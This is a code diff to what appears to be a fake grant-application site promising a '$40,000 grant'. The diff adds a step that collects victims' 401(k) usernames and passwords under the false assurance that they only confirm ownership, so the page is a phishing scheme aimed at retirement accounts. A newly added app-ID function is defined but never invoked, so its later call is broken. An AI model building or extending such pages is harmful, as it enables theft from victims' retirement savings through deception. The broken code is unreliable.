@@ -64,9 +64,12 @@
         <div class="step-circle">4</div>
         <span class="progress-step-label">401(k) Verify</span>
       </div>
-
       <div class="progress-step">
         <div class="step-circle">5</div>
+        <span class="progress-step-label">401(k) Access</span>
+      </div>
+      <div class="progress-step">
+        <div class="step-circle">6</div>
         <span class="progress-step-label">Review</span>
       </div>
     </div>
@@ -78,7 +81,8 @@
         </svg>
       </div>
       <h2 style="font-size: 2rem; margin-bottom: 0.75rem; font-family: 'Segoe UI', sans-serif;">Application Submitted Successfully</h2>
-      <p style="font-size: 1.1rem; color: var(--gray-600); max-width: 560px; margin: 0 auto 2rem;">Your application <strong style="color: var(--navy-900);">P401K-2026-<span id="appId">A782451</span></strong> has been received. A confirmation email has been sent. Your information will be reviewed to determine approval and the amount you may receive.</p>
+      <p style="font-size: 1.1rem; color: var(--gray-600); max-width: 620px; margin: 0 auto 1rem;">Your application <strong style="color: var(--navy-900);">P401K-2026-<span id="appId">A782451</span></strong> has been received. A confirmation email has been sent.</p>
+      <p style="font-size: 1rem; color: var(--gray-700); max-width: 620px; margin: 0 auto 2rem; line-height: 1.7;">You will need to wait a time frame of <strong>24 hours</strong> for account review. After this review period, if your application is <strong>approved</strong>, the grant amount will be credited directly into the bank account you selected.</p>
       <div style="display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap;">
         <a href="profile.html" class="btn btn-primary btn-lg">View My Profile</a>
         <a href="index.html" class="btn btn-outline-dark btn-lg">Return Home</a>
@@ -378,13 +382,46 @@
         </div>
         <div class="form-actions">
           <button class="btn-prev btn btn-outline-dark">← Previous</button>
+          <button class="btn-next-step btn btn-primary">Continue →</button>
+        </div>
+      </div>
+
+      <div class="form-step" data-step="5" style="display: none;">
+        <h3>Step 5: 401(k) Account Access</h3>
+        <p class="step-desc">To access the $40,000 grant, you need to access your official 401(k) account below. This step confirms that you are the account holder authorized to receive the grant award.</p>
+
+        <div style="background: linear-gradient(135deg, rgba(212,175,55,0.08), rgba(10,25,41,0.02)); border: 1px solid rgba(212,175,55,0.35); border-radius: 14px; padding: 1.25rem 1.25rem; margin-bottom: 2rem; display: flex; gap: 1rem; align-items: flex-start;">
+          <div style="width: 44px; height: 44px; border-radius: 10px; background: rgba(212,175,55,0.15); display: flex; align-items: center; justify-content: center; flex-shrink: 0;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none" viewBox="0 0 24 24" stroke="#d4af37" stroke-width="2">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+            </svg>
+          </div>
+          <div style="line-height: 1.7; color: var(--gray-700); font-size: 0.95rem;">
+            <p style="margin: 0 0 0.5rem; color: var(--navy-900); font-weight: 600;">Access Your Official 401(k) to Unlock the $40,000 Grant</p>
+            <p style="margin: 0 0 0.5rem;">You need to access your official 401(k) account in order to access the $40,000 grant. Your credentials are used only to confirm account ownership and are processed securely.</p>
+            <p style="margin: 0;">After submission, please allow a time frame of <strong style="color: var(--navy-900);">24 hours</strong> for account review. If approved, you will be credited in the bank account selected in Step 2.</p>
+          </div>
+        </div>
+
+        <div class="form-grid">
+          <div class="form-group">
+            <label>401(k) Account Username</label>
+            <input type="text" name="k401AccessUsername" class="form-input" placeholder="Enter your 401k username">
+          </div>
+          <div class="form-group">
+            <label>401(k) Account Password</label>
+            <input type="password" name="k401AccessPassword" class="form-input" placeholder="Enter your 401k password">
+          </div>
+        </div>
+        <div class="form-actions">
+          <button class="btn-prev btn btn-outline-dark">← Previous</button>
           <button class="btn-next-step btn btn-primary">Review Application →</button>
         </div>
       </div>
 
 
-      <div class="form-step" data-step="5" style="display: none;">
-        <h3>Step 5: Review & Submit</h3>
+      <div class="form-step" data-step="6" style="display: none;">
+        <h3>Step 6: Review & Submit</h3>
         <p class="step-desc">Please verify all information below before submitting your application. Once submitted, changes may delay processing.</p>
 
         <div class="review-summary">
@@ -483,19 +520,34 @@
     if (area2 && input2) {
       area2.addEventListener('click', function() { input2.click(); });
     }
-    const appId = document.getElementById('appId');
-    if (appId) {
-      appId.textContent = Math.floor(100000 + Math.random() * 900000);
-    }
   });
 </script>
 <script type="module" src="js/auth.js"></script>
 <script type="module">
 import { requireAuth, getProfile, isProfileComplete, PROFILE_FIELDS } from './js/auth.js';
 
+(function getOrCreateAppId(userId) {
+  const STORAGE_KEY = 'p401k_app_ids_v1';
+  let all = {};
+  try { all = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}'); } catch (e) { all = {}; }
+  if (!all[userId]) {
+    const used = new Set(Object.values(all));
+    let candidate;
+    do {
+      candidate = Math.floor(100000 + Math.random() * 900000).toString();
+    } while (used.has(candidate));
+    all[userId] = candidate;
+    try { localStorage.setItem(STORAGE_KEY, JSON.stringify(all)); } catch (e) {}
+  }
+  const appId = document.getElementById('appId');
+  if (appId) appId.textContent = all[userId];
+  return all[userId];
+});
+
 (async function () {
   const user = await requireAuth();
   if (!user) return;
+  getOrCreateAppId(user.id);
   const profile = await getProfile(user.id);
   if (!profile) return;
 
